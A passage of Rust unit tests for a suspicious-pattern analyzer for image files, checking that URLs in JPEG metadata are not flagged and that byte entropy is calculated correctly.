        data.extend_from_slice(&seg_len.to_be_bytes());
        data.extend_from_slice(url);
        // Pixel data after
        data.extend_from_slice(&[0xFF, 0xDA]); // SOS marker
        data.extend_from_slice(&[0x42; 100]);

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.jpg");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            !findings
                .iter()
                .any(|f| f.description.contains("URL found in image data")),
            "should NOT flag URL in JPEG metadata: {findings:?}"
        );
    }

    #[test]
    fn test_entropy() {
        let entropy = calculate_entropy(&[0, 0, 0, 0]);
        assert_eq!(entropy, 0.0);

        // All unique bytes should have high entropy
        let all_bytes: Vec<u8> = (0..=255).collect();
        let entropy = calculate_entropy(&all_bytes);
        assert!((entropy - 8.0).abs() < 0.001);
    }
}
